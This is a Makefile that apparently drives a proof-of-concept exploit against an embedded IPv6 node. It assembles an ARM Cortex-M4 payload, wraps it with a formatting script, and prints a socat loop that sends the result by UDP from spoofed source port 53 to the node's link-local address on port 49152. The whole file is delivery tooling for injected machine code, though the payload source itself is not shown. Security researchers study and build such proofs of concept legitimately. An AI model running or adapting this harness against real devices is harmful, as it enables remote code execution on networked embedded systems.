
NODEADDR ?= "the-nodes-link-local-address-with-scope"

.PHONY: info clean

info: message.bin
	@echo
	@echo "On the border router, run the following:"
	@echo
	@echo "while sleep 1; do echo `base64 < message.bin | tr -d \\\\n` | base64 -d | socat fd:0 udp6-sendto:'[$(NODEADDR)]':49152,sourceport=53; done"
	@echo

payload.elf: payload.S
	arm-none-eabi-as --warn -mcpu=cortex-m4 -mlittle-endian -mthumb -mfloat-abi=soft -o $@ $<

payload.bin: payload.elf
	arm-none-eabi-objcopy -O binary $< $@

message.bin: payload.bin
	python format-message.py

clean:
	$(RM) message.bin payload.bin payload.elf

